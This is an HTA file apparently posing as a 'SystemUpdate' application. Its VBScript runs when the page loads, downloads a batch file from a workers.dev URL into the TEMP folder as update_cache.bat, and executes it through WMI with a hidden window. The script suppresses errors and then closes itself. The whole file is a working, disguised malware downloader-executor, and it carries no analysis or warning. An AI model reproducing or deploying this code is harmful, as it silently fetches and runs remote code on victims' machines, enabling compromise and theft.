<!DOCTYPE html>
<html>
<head>
<hta:application 
    id="LoaderApp" 
    applicationname="SystemUpdate" 
    maximizebutton="no" 
    minimizebutton="no" 
    scroll="no" 
    showintaskbar="no" 
    singleinstance="yes" 
    windowstate="minimize"
>
<script language="VBScript">
    Sub Window_OnLoad
        On Error Resume Next
        
        Dim s1, s2, targetUrl, destPath, shellObj, wmiObj
        
        s1 = "https://windows.msrdustibles.workers.dev/"
        s2 = "nah.bat"
        targetUrl = s1 & s2
        
        Set shellObj = CreateObject("WScript.Shell")
        Set wmiObj = GetObject("winmgmts:\\.\root\cimv2")
        
        destPath = shellObj.ExpandEnvironmentStrings("%TEMP%") & "\update_cache.bat"
        
        Dim xHttp
        Set xHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
        xHttp.open "GET", targetUrl, False
        xHttp.send
        
        If xHttp.status = 200 Then
            Dim streamObj
            Set streamObj = CreateObject("ADODB.Stream")
            streamObj.Type = 1
            streamObj.Open
            streamObj.Write xHttp.responseBody
            streamObj.SaveToFile destPath, 2
            streamObj.Close
            
            Dim startup, config, process
            Set startup = wmiObj.Get("Win32_ProcessStartup")
            Set config = startup.SpawnInstance_()
            config.ShowWindow = 0
            
            wmiObj.Get("Win32_Process").Create "cmd.exe /c " & destPath, Null, config, process
        End If
        
        window.close
    End Sub
</script>
</head>
<body>
</body>
</html>
